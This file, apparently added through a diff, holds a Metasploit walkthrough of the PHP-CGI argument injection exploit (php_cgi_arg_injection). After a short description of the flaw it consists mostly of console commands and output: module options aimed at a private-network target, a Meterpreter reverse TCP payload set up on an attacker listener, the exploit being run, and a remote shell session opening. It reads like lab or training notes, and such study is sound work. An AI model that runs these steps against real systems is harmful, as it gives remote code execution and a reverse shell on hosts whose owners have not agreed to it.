@@ -1,0 +1,45 @@
+When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability. This module takes advantage of the -d flag to set php.ini directives to achieve code execution. From the advisory: "if there is NO unescaped '=' in the query string, the string is split on '+' (encoded space) characters, urldecoded, passed to a function that escapes shell metacharacters (the "encoded in a system-defined manner" from the RFC) and then passes them to the CGI binary." This module can also be used to exploit the plesk 0day disclosed by kingcope and exploited in the wild on June 2013.
+
+
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > show options 
+
+Module options (exploit/multi/http/php_cgi_arg_injection):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   PLESK        false            yes       Exploit Plesk
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS       192.168.1.38     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT        80               yes       The target port (TCP)
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
+   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
+   VHOST                         no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.39     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > set LPORT 1111
+LPORT => 1111
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.39:1111 
+[*] Sending stage (39282 bytes) to 192.168.1.38
+[*] Meterpreter session 2 opened (192.168.1.39:1111 -> 192.168.1.38:43505 ) at 2021-12-19 00:46:13 -0500
+
+meterpreter > whoami
+
